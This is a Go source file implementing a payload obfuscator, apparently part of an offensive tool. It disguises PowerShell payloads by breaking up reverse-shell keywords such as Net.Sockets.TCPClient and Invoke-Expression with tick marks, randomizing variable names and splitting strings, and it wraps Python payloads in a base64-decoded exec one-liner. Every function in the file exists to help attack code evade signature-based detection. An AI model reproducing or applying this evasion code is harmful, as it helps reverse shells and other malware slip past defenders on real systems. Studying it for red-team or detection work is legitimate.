package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
)

func Obfuscate(payload string, level int, pType string) string {
	if level <= 0 {
		return payload
	}

	pType = strings.ToLower(pType)
	if strings.Contains(pType, "powershell") || strings.Contains(pType, "ps") {
		return obfuscatePowerShell(payload, level)
	}
	if strings.Contains(pType, "python") {
		return obfuscatePython(payload, level)
	}

	return payload
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func obfuscatePowerShell(payload string, level int) string {
	switch level {
	case 1:
		// Simple keyword tick fragmentation (already in some PS payloads, but applying more)
		keywords := []string{"New-Object", "Net.Sockets.TCPClient", "GetStream", "IEX", "Invoke-Expression"}
		for _, k := range keywords {
			tick := ""
			for _, char := range k {
				tick += string(char) + "'"
			}
			tick = strings.TrimSuffix(tick, "'")
			payload = strings.ReplaceAll(payload, k, tick)
		}
	case 2, 3:
		// Variable randomization and string joining
		vars := []string{"$c", "$s", "$b", "$i", "$d", "$sb", "$t", "$x"}
		for _, v := range vars {
			payload = strings.ReplaceAll(payload, v, "$"+randomString(8))
		}
		if level == 3 {
			// Basic string concatenation for sensitive strings
			payload = strings.ReplaceAll(payload, "System.Text.ASCIIEncoding", "('System.Text.'+'ASCIIEncoding')")
		}
	}
	return payload
}

func obfuscatePython(payload string, level int) string {
	if level >= 1 {
		// Python base64 exec obfuscation
		b64 := base64.StdEncoding.EncodeToString([]byte(payload))
		return fmt.Sprintf("python3 -c \"import base64;exec(base64.b64decode('%s'))\"", b64)
	}
	return payload
}
